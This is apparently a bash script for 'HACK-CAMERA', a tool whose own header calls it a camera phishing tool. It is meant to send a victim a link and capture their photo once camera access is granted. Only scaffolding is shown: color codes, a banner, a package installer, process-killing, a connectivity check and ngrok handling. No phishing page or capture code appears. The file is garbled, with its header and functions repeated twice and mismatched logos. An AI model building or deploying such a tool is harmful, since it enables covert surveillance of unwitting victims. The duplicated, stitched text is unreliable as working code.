#!/bin/bash

# HACK-CAMERA 
# Version    : 2.1
# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : X PHANTOM PH4N70M
# Github     : https://github.com/hackerxphantom
# Join Us    : https://bit.ly/3PV3S3r
# Date       : 29-05-2022
# Language   : Shell, HTML, Css
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
ask="${red}[${white}?${red}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${red}[${white}√${red}] ${green}"


cwd=`pwd`

# Logo 
logo="    
${blue}  _   _    _    ____ _  __      ____        
${blue} | | | |  / \  / ___| |/ /     / ___|   
${blue} | |_| | / _ \| |   | ' /_____| |     zubair hacker
${blue} |  _  |/ ___ \ |___| . \_____| |___  
${blue} |_| |_/_/   \_\____|_|\_\     \____/
${green}                                               [By X PHANTOM (PH4N7OM)]
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}
#!/bin/bash

# HACK-CAMERA 
# Version    : 2.1
# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : X PHANTOM PH4N70M
# Github     : https://github.com/hackerxphantom
# Join Us    : https://bit.ly/3PV3S3r
# Date       : 29-05-2022
# Language   : Shell, HTML, Css
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
ask="${red}[${white}?${red}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${red}[${white}√${red}] ${green}"


cwd=`pwd`

# Logo 
logo="    
${blue}  _   _    _    ____ _  __      ____    _    __  __ _____ ____      _    
${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \   
${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
${green}                                               [By X PHANTOM (PH4N7OM)]
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Delete ngrok file
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}



# Delete ngrok file
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}
